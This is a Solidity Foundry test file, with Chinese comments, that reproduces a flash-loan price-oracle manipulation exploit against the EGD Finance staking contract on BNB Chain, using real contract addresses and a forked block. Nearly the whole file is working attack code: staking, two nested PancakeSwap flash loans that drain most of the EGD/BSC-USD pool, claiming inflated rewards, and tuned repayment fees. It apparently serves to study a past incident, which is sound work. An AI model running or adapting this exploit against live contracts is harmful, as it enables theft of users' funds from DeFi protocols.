pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

contract ContractTest is Test {

    // 两次闪电贷分别借款金额
    uint256 constant FLASHLOANAMOUNT_01 = 2000 * 1e18;
    uint256 FLASHLOANAMOUNT_02;

    IERC20 public EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);
    IERC20 public BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);

    IPancakeRouter public router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePair public pair_wbnbUSD = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IPancakePair public pair_egdUSD = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);

    IEGDFinance public EGDFinance = IEGDFinance(0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370);
    bool public countFlashloan = false; // 用于控制两次不同的闪电贷回调函数

    function setUp() public {
        vm.createSelectFork("bsc", 20_245_521); // 黑客第一笔交易是进行stake，在20_245_522

        vm.label(address(EGD), "EGD");
        vm.label(address(BSC_USD), "BSC_USD");
        vm.label(address(router), "router");
        vm.label(address(pair_wbnbUSD), "pair_wbnbUSD");
        vm.label(address(pair_egdUSD), "pair_egdUSD");
        vm.label(address(EGDFinance), "EGDFinance");
    }

    function testExploit() public {

        // 做好准备工作: 授权
        EGD.approve(address(router), ~uint256(0));
        BSC_USD.approve(address(router), ~uint256(0));
        EGD.approve(address(EGDFinance), ~uint256(0));
        BSC_USD.approve(address(EGDFinance), ~uint256(0));

        // 攻击前准备：质押stake
        console.log("[before attack]");
        console.log("   stake 100 ether");
        deal(address(BSC_USD), address(this), 100 ether);
        EGDFinance.bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        EGDFinance.stake(100 ether);

        console.log();
        console.log("after 10 seconds");
        // 质押和获取利润一般不可以在同一个交易当中
        // 注意：获取的利润和时间有关系，时间越长，获取的利润就越多。
        //       但是EGDFinance在池子中的EGD余额是有限的，你的利润太多，取完了就会报错。
        //       因此，质押的数量和时间是有讲究的，否则会报错说余额不够。
        //       这里我们选择质押100ETH，并且质押10秒
        vm.warp(block.timestamp + 10);
        console.log();

        console.log("[start attack]");
        emit log_named_decimal_uint("   [INFO] attackContract BSC-USD Balance", IERC20(BSC_USD).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("   [INFO] EGD/BSC-USD Price before price manipulation", IEGDFinance(EGDFinance).getEGDPrice(), 18);
        console.log("   Flashloan[1] : borrow 2,000 BSC-USD from BSC-USD/WBNB pool");
        
        // 发起攻击
        // 我们闪电贷借款2000个BSC-USD，跟攻击事件的一样
        pair_wbnbUSD.swap(FLASHLOANAMOUNT_01, 0, address(this), new bytes(1));
        console.log("   Flashloan[1] payback success");

        emit log_named_decimal_uint("   [INFO] attackContract BSC-USD Balance", IERC20(BSC_USD).balanceOf(address(this)), 18);

        IERC20(BSC_USD).transfer(msg.sender, IERC20(BSC_USD).balanceOf(address(this)));        
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external{
        if(countFlashloan == false){
            console.log("       borrow BSC-USD, the price of BSC-USD decrease");
            countFlashloan = true;

            // 第二次闪电贷：借出池子的99.99999925%，好像是说无法借出全部，否则会报流动性余额啥的异常, 如果借少了导致获利减少，不够还款闪电贷
            FLASHLOANAMOUNT_02 = IERC20(BSC_USD).balanceOf(address(pair_egdUSD)) * 9_999_999_925 / 10_000_000_000;
            // FLASHLOANAMOUNT_02 = IERC20(BSC_USD).balanceOf(address(pair_egdUSD)) * 90 / 100;
            console.log("       Flashloan[2] : borrow 99.99999925% BSC-USD of EGD/BSC-USD pool");
            pair_egdUSD.swap(0, FLASHLOANAMOUNT_02, address(this), new bytes(1));
            console.log("       Flashloan[2] payback success");

            address[] memory path = new address[](2);
            path[0] = address(EGD);
            path[1] = address(BSC_USD);
            console.log("       swap: EGD => BSC-USD");
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                IERC20(EGD).balanceOf(address(this)), 1, path, address(this), block.timestamp
            );

            // 手续费是至少大于0.25%，我们选择0.26%。如果还太多，我们攻击所得的余额不够也会报错，因此要控制好数量
            uint256 swapfee = (FLASHLOANAMOUNT_01 * 10_000 / 9974) - FLASHLOANAMOUNT_01;
            BSC_USD.transfer(address(pair_wbnbUSD), FLASHLOANAMOUNT_01 + swapfee);
        }else{
            console.log("           borrow BSC-USD, the price of BSC-USD decrease again");
            emit log_named_decimal_uint("           [INFO] EGD/BSC-USD Price after price manipulation", IEGDFinance(EGDFinance).getEGDPrice(), 18);

            console.log("           Claim all EGD Token reward from EGD Finance contract");
            EGDFinance.claimAllReward();

            emit log_named_decimal_uint("           [INFO] Get reward (EGD token)", IERC20(EGD).balanceOf(address(this)), 18);
            
            // 手续费是至少大于0.25%，我们选择0.26%。如果还太多，我们攻击所得的余额不够也会报错，因此要控制好数量
            uint256 swapfee = (FLASHLOANAMOUNT_02 * 10_000 / 9974) - FLASHLOANAMOUNT_02;
            BSC_USD.transfer(address(pair_egdUSD), FLASHLOANAMOUNT_02 + swapfee);
        }
    } 
}